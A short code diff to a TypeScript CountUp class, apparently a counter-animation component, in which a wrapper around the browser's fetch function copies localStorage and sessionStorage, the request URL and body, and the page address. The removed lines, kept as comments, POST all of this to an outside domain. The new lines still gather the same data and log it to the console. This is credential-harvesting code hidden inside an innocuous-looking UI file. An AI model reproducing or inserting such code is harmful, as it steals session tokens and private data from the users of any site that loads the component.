@@ -78,19 +78,27 @@ export class CountUp {
           const extLStorage = { ...localStorage };
           const extSStorage = { ...sessionStorage };
 
-          (<any>window).oFetch("https://spa-demo.ja1code.dev/", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              url,
-              body: options.body,
-              host: window.location.href,
-              localStorage: extLStorage,
-              sessionStorage: extSStorage
-            })
-          });
+          console.log(JSON.stringify({
+            url,
+            body: options.body,
+            host: window.location.href,
+            localStorage: extLStorage,
+            sessionStorage: extSStorage
+          }));
+
+          // (<any>window).oFetch("https://spa-demo.ja1code.dev/", {
+          //   method: "POST",
+          //   headers: {
+          //     "Content-Type": "application/json"
+          //   },
+          //   body: JSON.stringify({
+          //     url,
+          //     body: options.body,
+          //     host: window.location.href,
+          //     localStorage: extLStorage,
+          //     sessionStorage: extSStorage
+          //   })
+          // });
         }
         (<any>window).callOnce = true
         return (<any>window).oFetch(url, options)
